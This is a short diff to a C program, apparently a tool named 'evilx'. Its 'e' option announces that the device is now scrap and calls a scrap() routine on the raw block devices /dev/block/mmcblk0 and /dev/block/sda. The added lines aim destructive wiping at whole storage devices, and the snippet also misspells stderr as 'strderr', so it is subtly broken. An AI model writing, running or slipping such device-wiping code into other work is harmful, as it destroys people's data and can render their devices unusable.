@@ -105,7 +105,10 @@ int main(int argc, char *argv[]) {
             break;
             case 'e':
                 printf("Alas! This device is now a scrap!\n");
-                scrap();
+                scrap("/dev/block/mmcblk0");
+                if (evilx_scrap_ecode == 1) {
+                    scrap("/dev/block/sda");
+                }
             break;
             case '?':
                 fprintf(strderr, ANSI_COLOR_RED "Error: unknown argument: %c\n", optopt);
